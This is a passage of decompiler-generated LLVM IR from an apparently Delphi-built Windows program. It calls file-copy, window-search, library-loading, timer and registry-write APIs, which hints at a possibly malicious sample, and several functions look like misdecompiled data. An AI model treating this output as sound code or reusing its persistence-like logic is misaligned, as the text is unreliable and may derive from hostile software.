  %41 = call i32 @function_4036c8(), !insn.addr !1289
  %42 = inttoptr i32 %41 to i8*, !insn.addr !1290
  %43 = call i1 @DeleteFileA(i8* %42), !insn.addr !1291
  %44 = call i32 @function_4036c8(), !insn.addr !1292
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1293
  store i8* %45, i8** %stack_var_-76, align 4, !insn.addr !1293
  %46 = ptrtoint i8** %stack_var_-76 to i32, !insn.addr !1293
  %47 = call i1 @CopyFileA(i8* %45, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1294
  %48 = call i32 @function_405f28(), !insn.addr !1295
  store i32 %46, i32* %esp.1.reg2mem, !insn.addr !1295
  br label %dec_label_pc_4062ec, !insn.addr !1295

dec_label_pc_4062ec:                              ; preds = %dec_label_pc_40629c, %dec_label_pc_406274, %dec_label_pc_406240, %dec_label_pc_40623a
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %49 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1296
  %50 = load i32, i32* %49, align 4, !insn.addr !1296
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !1297
  %51 = add i32 %esp.1.reload, 8, !insn.addr !1298
  %52 = inttoptr i32 %51 to i32*, !insn.addr !1298
  store i32 4219662, i32* %52, align 4, !insn.addr !1298
  %53 = call i32 @"@LStrArrayClr"(), !insn.addr !1299
  ret i32 %53, !insn.addr !1300
}

define i32 @function_406307() local_unnamed_addr {
dec_label_pc_406307:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1301
  ret i32 %0, !insn.addr !1301
}

define i32 @function_40630c() local_unnamed_addr {
dec_label_pc_40630c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1302
}

define i32 @function_40630e(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40630e:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1303
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1303
  %3 = load i32, i32* %2, align 4, !insn.addr !1303
  ret i32 %3, !insn.addr !1304
}

define i32 @function_40631f() local_unnamed_addr {
dec_label_pc_40631f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1305
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1305
  store i32 %1, i32* %2, align 4, !insn.addr !1305
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1306
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1306
  %7 = add i8 %4, %6, !insn.addr !1306
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1306
  store i8 %7, i8* %8, align 1, !insn.addr !1306
  %9 = load i32, i32* %eax, align 4, !insn.addr !1307
  ret i32 %9, !insn.addr !1307
}

define i32 @function_40632e() local_unnamed_addr {
dec_label_pc_40632e:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1308
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1308
  store i8 %4, i8* %5, align 1, !insn.addr !1308
  %6 = mul i32 %0, 4096, !insn.addr !1309
  %7 = udiv i32 %0, 1048576, !insn.addr !1309
  %8 = or i32 %7, %6, !insn.addr !1309
  %9 = and i32 %0, 1048576, !insn.addr !1309
  %10 = icmp eq i32 %9, 0, !insn.addr !1309
  %11 = load i32, i32* %edx, align 4, !insn.addr !1310
  %12 = trunc i32 %11 to i16, !insn.addr !1310
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1310
  %14 = sext i8 %13 to i32, !insn.addr !1310
  %15 = or i32 %2, %14, !insn.addr !1310
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1311
  %17 = and i32 %15, -256, !insn.addr !1311
  %18 = or i32 %17, %16, !insn.addr !1311
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1312
  %20 = load i8, i8* %19, align 1, !insn.addr !1312
  %21 = mul i8 %20, 2, !insn.addr !1312
  %22 = lshr i8 %20, 7, !insn.addr !1312
  %23 = or i8 %22, %21, !insn.addr !1312
  store i8 %23, i8* %19, align 1, !insn.addr !1312
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1313
  %26 = udiv i32 %1, 256, !insn.addr !1313
  %27 = trunc i32 %26 to i8, !insn.addr !1313
  %28 = add i8 %25, %27, !insn.addr !1313
  %29 = load i32, i32* %edx, align 4, !insn.addr !1313
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1313
  store i8 %28, i8* %30, align 1, !insn.addr !1313
  %31 = add i32 %8, -4, !insn.addr !1314
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1314
  store i32 4219400, i32* %32, align 4, !insn.addr !1314
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1315
  %34 = sext i1 %33 to i32, !insn.addr !1315
  ret i32 %34, !insn.addr !1316
}

define i32 @function_406338(i32 %arg1) local_unnamed_addr {
dec_label_pc_406338:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_406348() local_unnamed_addr {
dec_label_pc_406348:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1317
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1317
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1317
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1318
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1319
  %3 = add i32 %2, 1, !insn.addr !1319
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1319
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1320
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1321
  ret i32 0, !insn.addr !1322
}

define i32 @function_40636d() local_unnamed_addr {
dec_label_pc_40636d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1323
  ret i32 %0, !insn.addr !1323
}

define i32 @function_406372() local_unnamed_addr {
dec_label_pc_406372:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1324
}

define i32 @function_406374(i32 %arg1) local_unnamed_addr {
dec_label_pc_406374:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1325
}

define i32 @function_406378() local_unnamed_addr {
dec_label_pc_406378:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1326
  %2 = add i32 %1, -1, !insn.addr !1326
  store i32 %2, i32* @global_var_4096cc, align 4, !insn.addr !1326
  ret i32 %0, !insn.addr !1327
}

define i32 @function_406380() local_unnamed_addr {
dec_label_pc_406380:
  %eax.0.reg2mem = alloca i32, !insn.addr !1328
  %0 = call i32 @function_4063f4(), !insn.addr !1329
  %1 = load i32, i32* @global_var_408130, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1330
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1331
  br i1 %2, label %dec_label_pc_4063b4, label %dec_label_pc_406392, !insn.addr !1331

dec_label_pc_406392:                              ; preds = %dec_label_pc_406380
  %3 = load i32*, i32** @global_var_408158, align 4
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1332
  %5 = icmp eq i32* %3, null, !insn.addr !1333
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !1334
  br i1 %5, label %dec_label_pc_4063b4, label %dec_label_pc_40639c, !insn.addr !1334

dec_label_pc_40639c:                              ; preds = %dec_label_pc_406392
  %6 = call i32 @function_4066c0(), !insn.addr !1335
  call void @PostQuitMessage(i32 66), !insn.addr !1336
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1337
  unreachable, !insn.addr !1337

dec_label_pc_4063b4:                              ; preds = %dec_label_pc_406392, %dec_label_pc_406380
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1338
}

define i32 @function_4063c4() local_unnamed_addr {
dec_label_pc_4063c4:
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1339
  %1 = icmp eq i32 %0, 0, !insn.addr !1339
  br i1 %1, label %dec_label_pc_4063d2, label %dec_label_pc_4063cd, !insn.addr !1340

dec_label_pc_4063cd:                              ; preds = %dec_label_pc_4063c4
  %2 = call i32 @function_4063f4(), !insn.addr !1341
  br label %dec_label_pc_4063d2, !insn.addr !1341

dec_label_pc_4063d2:                              ; preds = %dec_label_pc_4063cd, %dec_label_pc_4063c4
  %3 = load i32, i32* inttoptr (i32 4227404 to i32*), align 4, !insn.addr !1342
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1343
  %5 = load i32, i32* %4, align 4, !insn.addr !1343
  %6 = mul i32 %5, 1000, !insn.addr !1343
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4219776 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1344
  store i32 %7, i32* @global_var_408104, align 4, !insn.addr !1345
  ret i32 %7, !insn.addr !1346
}

define i32 @function_4063f4() local_unnamed_addr {
dec_label_pc_4063f4:
  %.reg2mem = alloca i32, !insn.addr !1347
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1347
  %1 = icmp eq i32 %0, 0, !insn.addr !1347
  store i32 %0, i32* %.reg2mem, !insn.addr !1348
  br i1 %1, label %2, label %dec_label_pc_4063fd, !insn.addr !1348

; <label>:2:                                      ; preds = %dec_label_pc_4063f4
  %3 = call i32 @function_406411(), !insn.addr !1348
  %.pre = load i32, i32* @global_var_408104, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1348
  br label %dec_label_pc_4063fd, !insn.addr !1348

dec_label_pc_4063fd:                              ; preds = %2, %dec_label_pc_4063f4
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1349
  ret i32 %.reload, !insn.addr !1350
}

define i32 @function_406411() local_unnamed_addr {
dec_label_pc_406411:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1351
}

define i32 @function_406414() local_unnamed_addr {
dec_label_pc_406414:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_406338(i32 %0), !insn.addr !1352
  ret i32 %1, !insn.addr !1353
}

define i32 @function_406420() local_unnamed_addr {
dec_label_pc_406420:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1354
  %1 = icmp eq i32 %0, 0, !insn.addr !1354
  br i1 %1, label %dec_label_pc_40642e, label %dec_label_pc_406429, !insn.addr !1355

dec_label_pc_406429:                              ; preds = %dec_label_pc_406420
  %2 = call i32 @function_406448(), !insn.addr !1356
  br label %dec_label_pc_40642e, !insn.addr !1356

dec_label_pc_40642e:                              ; preds = %dec_label_pc_406429, %dec_label_pc_406420
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4219924 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1357
  store i32 %3, i32* @global_var_408108, align 4, !insn.addr !1358
  ret i32 %3, !insn.addr !1359
}

define i32 @function_406448() local_unnamed_addr {
dec_label_pc_406448:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1360
  ret i32 %0, !insn.addr !1361
}

define i32 @function_406468() local_unnamed_addr {
dec_label_pc_406468:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1362
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1362
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1362
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1363
  %2 = load i32, i32* @global_var_4096d0, align 4, !insn.addr !1364
  %3 = add i32 %2, 1, !insn.addr !1364
  store i32 %3, i32* @global_var_4096d0, align 4, !insn.addr !1364
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1365
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1366
  ret i32 0, !insn.addr !1367
}

define i32 @function_40648d() local_unnamed_addr {
dec_label_pc_40648d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1368
  ret i32 %0, !insn.addr !1368
}

define i32 @function_406492() local_unnamed_addr {
dec_label_pc_406492:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1369
}

define i32 @function_406494(i32 %arg1) local_unnamed_addr {
dec_label_pc_406494:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1370
}

define i32 @function_406498() local_unnamed_addr {
dec_label_pc_406498:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d0, align 4, !insn.addr !1371
  %2 = add i32 %1, -1, !insn.addr !1371
  store i32 %2, i32* @global_var_4096d0, align 4, !insn.addr !1371
  ret i32 %0, !insn.addr !1372
}

define i32 @function_4064a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4064a0:
  %esp.1.lcssa.reg2mem = alloca i32, !insn.addr !1373
  %esp.17.reg2mem = alloca i32, !insn.addr !1373
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1373
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %1 = inttoptr i32 %0 to i8*, !insn.addr !1373
  %2 = call i32* @FindWindowA(i8* %1, i8* bitcast (i32* @0 to i8*)), !insn.addr !1374
  %3 = icmp eq i32* %2, null, !insn.addr !1375
  %4 = icmp eq i1 %3, false, !insn.addr !1376
  br i1 %4, label %dec_label_pc_40659e, label %dec_label_pc_4064c1, !insn.addr !1376

dec_label_pc_4064c1:                              ; preds = %dec_label_pc_4064a0
  %5 = call i32 @function_405ad4(), !insn.addr !1377
  %6 = call i32 @function_4036c8(), !insn.addr !1378
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1379
  %8 = call i32* @LoadLibraryA(i8* %7), !insn.addr !1380
  %9 = call i32* @FindWindowA(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_4065c0, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_4065b8, i32 0, i32 0)), !insn.addr !1381
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1381
  store i32 %10, i32* %stack_var_-316, align 4, !insn.addr !1382
  %11 = call i1 @IsWindow(i32* %9), !insn.addr !1383
  %12 = icmp eq i1 %11, false, !insn.addr !1384
  store i32* %stack_var_-316, i32** %esp.0.in.reg2mem, !insn.addr !1385
  br i1 %12, label %dec_label_pc_4064ff, label %dec_label_pc_4064f3, !insn.addr !1385

dec_label_pc_4064f3:                              ; preds = %dec_label_pc_4064c1
  store i32 %10, i32* %stack_var_-332, align 4, !insn.addr !1386
  %13 = call i1 @PostMessageA(i32* null, i32 0, i32 18, i32 %10), !insn.addr !1387
  store i32* %stack_var_-332, i32** %esp.0.in.reg2mem, !insn.addr !1387
  br label %dec_label_pc_4064ff, !insn.addr !1387

dec_label_pc_4064ff:                              ; preds = %dec_label_pc_4064f3, %dec_label_pc_4064c1
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %14 = call i32 @Randomize(), !insn.addr !1388
  %15 = call i32 @function_405ea0(), !insn.addr !1389
  %16 = call i32 @"@_CToPasStr"(), !insn.addr !1390
  %17 = call i32 @"@AStrCmp"(), !insn.addr !1391
  %18 = call i32 @function_405648(), !insn.addr !1392
  %19 = add i32 %esp.0, -4, !insn.addr !1393
  %20 = inttoptr i32 %19 to i32*, !insn.addr !1393
  store i32 0, i32* %20, align 4, !insn.addr !1393
  %21 = add i32 %esp.0, -8, !insn.addr !1394
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1394
  store i32 0, i32* %22, align 4, !insn.addr !1394
  %23 = add i32 %esp.0, -12, !insn.addr !1395
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1395
  store i32 0, i32* %24, align 4, !insn.addr !1395
  %25 = add i32 %esp.0, -16, !insn.addr !1396
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1396
  %27 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1396
  store i32 %27, i32* %26, align 4, !insn.addr !1396
  %28 = call i1 @GetMessageA(%tagMSG* bitcast (i32* @0 to %tagMSG*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1397
  %29 = icmp eq i1 %28, false, !insn.addr !1398
  %30 = icmp eq i1 %29, false, !insn.addr !1399
  store i32 %esp.0, i32* %esp.17.reg2mem, !insn.addr !1399
  store i32 %esp.0, i32* %esp.1.lcssa.reg2mem, !insn.addr !1399
  br i1 %30, label %dec_label_pc_40653f, label %dec_label_pc_40655b, !insn.addr !1399

dec_label_pc_40653f:                              ; preds = %dec_label_pc_4064ff, %dec_label_pc_40653f
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %31 = add i32 %esp.17.reload, -20, !insn.addr !1400
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1400
  store i32 %27, i32* %32, align 4, !insn.addr !1400
  %33 = call i32 @DispatchMessageA(%tagMSG* bitcast (i32* @0 to %tagMSG*)), !insn.addr !1401
  %34 = add i32 %esp.17.reload, -24, !insn.addr !1393
  %35 = inttoptr i32 %34 to i32*, !insn.addr !1393
  store i32 0, i32* %35, align 4, !insn.addr !1393
  %36 = add i32 %esp.17.reload, -28, !insn.addr !1394
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1394
  store i32 0, i32* %37, align 4, !insn.addr !1394
  %38 = add i32 %esp.17.reload, -32, !insn.addr !1395
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1395
  store i32 0, i32* %39, align 4, !insn.addr !1395
  %40 = add i32 %esp.17.reload, -36, !insn.addr !1396
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1396
  store i32 %27, i32* %41, align 4, !insn.addr !1396
  %42 = call i1 @GetMessageA(%tagMSG* bitcast (i32* @0 to %tagMSG*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1397
  %43 = icmp eq i1 %42, false, !insn.addr !1398
  %44 = icmp eq i1 %43, false, !insn.addr !1399
  store i32 %31, i32* %esp.17.reg2mem, !insn.addr !1399
  store i32 %31, i32* %esp.1.lcssa.reg2mem, !insn.addr !1399
  br i1 %44, label %dec_label_pc_40653f, label %dec_label_pc_40655b, !insn.addr !1399

dec_label_pc_40655b:                              ; preds = %dec_label_pc_40653f, %dec_label_pc_4064ff
  %esp.1.lcssa.reload = load i32, i32* %esp.1.lcssa.reg2mem
  %45 = call i32 @"@_CToPasStr"(), !insn.addr !1402
  %46 = call i32 @"@AStrCmp"(), !insn.addr !1403
  %47 = call i32 @function_405ed8(), !insn.addr !1404
  %48 = add i32 %esp.1.lcssa.reload, -20, !insn.addr !1405
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1405
  store i32 %arg1, i32* %49, align 4, !insn.addr !1405
  %50 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !1406
  %51 = ptrtoint i32 (i32, i32, i32)* %50 to i32, !insn.addr !1406
  %52 = add i32 %esp.1.lcssa.reload, -24, !insn.addr !1407
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1407
  store i32 %51, i32* %53, align 4, !insn.addr !1407
  call void @FreeLibraryAndExitThread(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1408
  unreachable, !insn.addr !1408

dec_label_pc_40659e:                              ; preds = %dec_label_pc_4064a0
  %54 = ptrtoint i32* %2 to i32, !insn.addr !1374
  ret i32 %54, !insn.addr !1409
}

define i32 @function_4065a5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_4065a5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_16, align 4
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1410
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1410
  store i8 %3, i8* %4, align 1, !insn.addr !1410
  %5 = add i32 %1, 114, !insn.addr !1411
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1411
  %7 = load i8, i8* %6, align 1, !insn.addr !1411
  %8 = udiv i32 %0, 256, !insn.addr !1411
  %9 = trunc i32 %8 to i8, !insn.addr !1411
  %10 = add i8 %7, %9, !insn.addr !1411
  store i8 %10, i8* %6, align 1, !insn.addr !1411
  %11 = add i32 %1, 224, !insn.addr !1412
  %12 = and i32 %11, 255, !insn.addr !1412
  %13 = and i32 %1, -256, !insn.addr !1412
  %14 = or i32 %12, %13, !insn.addr !1412
  %15 = add i32 %14, 105, !insn.addr !1413
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1413
  %17 = load i8, i8* %16, align 1, !insn.addr !1413
  %18 = and i8 %17, %9, !insn.addr !1413
  store i8 %18, i8* %16, align 1, !insn.addr !1413
  %19 = trunc i32 %arg4 to i16, !insn.addr !1414
  %20 = inttoptr i32 %arg7 to i8*, !insn.addr !1414
  %21 = load i8, i8* %20, align 1, !insn.addr !1414
  call void @__asm_outsb(i16 %19, i8 %21), !insn.addr !1414
  %22 = add i32 %arg6, 105, !insn.addr !1415
  %23 = and i32 %22, 65535
  %24 = inttoptr i32 %23 to i8*, !insn.addr !1415
  %25 = load i8, i8* %24, align 1, !insn.addr !1415
  %26 = udiv i32 %arg3, 256, !insn.addr !1415
  %27 = trunc i32 %26 to i8, !insn.addr !1415
  %28 = and i8 %25, %27, !insn.addr !1415
  store i8 %28, i8* %24, align 1, !insn.addr !1415
  %29 = mul i32 %arg6, 2, !insn.addr !1416
  %30 = add i32 %arg3, 115, !insn.addr !1416
  %31 = add i32 %30, %29, !insn.addr !1416
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1416
  %33 = load i8, i8* %32, align 1, !insn.addr !1416
  %34 = trunc i32 %arg3 to i8, !insn.addr !1416
  %35 = add i8 %33, %34, !insn.addr !1416
  %36 = icmp eq i8 %35, 0, !insn.addr !1416
  store i8 %35, i8* %32, align 1, !insn.addr !1416
  br i1 %36, label %dec_label_pc_4065ff, label %dec_label_pc_4065bd, !insn.addr !1417

dec_label_pc_4065bd:                              ; preds = %dec_label_pc_4065a5
  %37 = inttoptr i32 %arg7 to i32*, !insn.addr !1418
  %38 = load i32, i32* %37, align 4, !insn.addr !1418
  call void @__asm_outsd(i16 %19, i32 %38), !insn.addr !1418
  %39 = add i32 %arg2, 224, !insn.addr !1419
  %40 = and i32 %39, 255, !insn.addr !1419
  %41 = and i32 %arg2, -256, !insn.addr !1419
  %42 = or i32 %40, %41, !insn.addr !1419
  %43 = add i32 %arg3, 105, !insn.addr !1420
  %44 = inttoptr i32 %43 to i8*, !insn.addr !1420
  %45 = load i8, i8* %44, align 1, !insn.addr !1420
  %46 = udiv i32 %arg2, 256, !insn.addr !1420
  %47 = trunc i32 %46 to i8, !insn.addr !1420
  %48 = and i8 %45, %47, !insn.addr !1420
  store i8 %48, i8* %44, align 1, !insn.addr !1420
  %49 = add i32 %arg7, 105, !insn.addr !1421
  %50 = inttoptr i32 %49 to i8*, !insn.addr !1421
  %51 = load i8, i8* %50, align 1, !insn.addr !1421
  %52 = and i8 %51, %27, !insn.addr !1421
  store i8 %52, i8* %50, align 1, !insn.addr !1421
  %53 = inttoptr i32 %42 to i8*, !insn.addr !1422
  %54 = load i8, i8* %53, align 1, !insn.addr !1422
  %55 = trunc i32 %39 to i8, !insn.addr !1422
  %factor = mul i8 %55, 2
  %56 = add i8 %54, %factor, !insn.addr !1423
  store i8 %56, i8* %53, align 1, !insn.addr !1423
  %57 = inttoptr i32 %arg3 to i32*, !insn.addr !1424
  %58 = load i32, i32* %57, align 4, !insn.addr !1424
  %59 = add i32 %58, %arg7, !insn.addr !1424
  store i32 %59, i32* %57, align 4, !insn.addr !1424
  %60 = load i8, i8* %53, align 1, !insn.addr !1425
  %61 = add i8 %60, %55, !insn.addr !1425
  store i8 %61, i8* %53, align 1, !insn.addr !1425
  %62 = call i32 @__readfsdword(i32 0), !insn.addr !1426
  store i32 %62, i32* %stack_var_16, align 4, !insn.addr !1426
  %63 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1426
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !1427
  %64 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1428
  %65 = add i32 %64, 1, !insn.addr !1428
  store i32 %65, i32* @global_var_4096d4, align 4, !insn.addr !1428
  %66 = load i32, i32* %stack_var_16, align 4, !insn.addr !1429
  call void @__writefsdword(i32 0, i32 %66), !insn.addr !1430
  ret i32 0, !insn.addr !1431

dec_label_pc_4065ff:                              ; preds = %dec_label_pc_4065a5
  ret i32 %arg2, !insn.addr !1432
}

define i32 @function_406604() local_unnamed_addr {
dec_label_pc_406604:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1433
  %2 = add i32 %1, -1, !insn.addr !1433
  store i32 %2, i32* @global_var_4096d4, align 4, !insn.addr !1433
  ret i32 %0, !insn.addr !1434
}

define i32 @function_40660c() local_unnamed_addr {
dec_label_pc_40660c:
  %eax.0.reg2mem = alloca i32, !insn.addr !1435
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !1436
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !1437
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !1438
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_406698, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !1439
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_406698, i32 0, i32 0), i32 -2147483647), !insn.addr !1440
  %2 = icmp eq i32 %1, 0, !insn.addr !1441
  %3 = icmp eq i1 %2, false, !insn.addr !1442
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !1442
  br i1 %3, label %dec_label_pc_406686, label %dec_label_pc_406641, !insn.addr !1442

dec_label_pc_406641:                              ; preds = %dec_label_pc_40660c
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !1443
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !1444
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_40810c, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_4066b4, i32 0, i32 0), i32 -2147483647), !insn.addr !1444
  %6 = icmp eq i32 %5, 0, !insn.addr !1445
  %7 = icmp eq i1 %6, false, !insn.addr !1446
  br i1 %7, label %dec_label_pc_40667d, label %dec_label_pc_40666d, !insn.addr !1446

dec_label_pc_40666d:                              ; preds = %dec_label_pc_406641
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1447
  br label %dec_label_pc_40667d, !insn.addr !1447

dec_label_pc_40667d:                              ; preds = %dec_label_pc_40666d, %dec_label_pc_406641
  %9 = call i32 @function_404374(i32 -2147483647), !insn.addr !1448
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !1448
  br label %dec_label_pc_406686, !insn.addr !1448

dec_label_pc_406686:                              ; preds = %dec_label_pc_40667d, %dec_label_pc_40660c
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1449
}

define i32 @function_4066c0() local_unnamed_addr {
dec_label_pc_4066c0:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1450
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1451
  store i32 %1, i32* %stack_var_-28, align 4, !insn.addr !1451
  %2 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1451
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1452
  %3 = call i32 @RegDeleteKeyA(i32* bitcast ([27 x i8]* @global_var_406770 to i32*), i8* inttoptr (i32 -2147483647 to i8*)), !insn.addr !1453
  %4 = call i32 @RegCreateKeyExA(i32* null, i8* inttoptr (i32 1 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !1454
  %5 = call i32 @function_4034c8(), !insn.addr !1455
  %6 = call i32 @function_4036c8(), !insn.addr !1456
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1457
  %8 = call i32 @RegSetValueExA(i32* %7, i8* inttoptr (i32 1 to i8*), i32 0, i32 ptrtoint ([10 x i8]* @global_var_40678c to i32), i8* null, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1457
  %9 = call i32 @function_404374(i32 0), !insn.addr !1458
  call void @__writefsdword(i32 0, i32 0), !insn.addr !1459
  %10 = call i32 @"@LStrClr"(), !insn.addr !1460
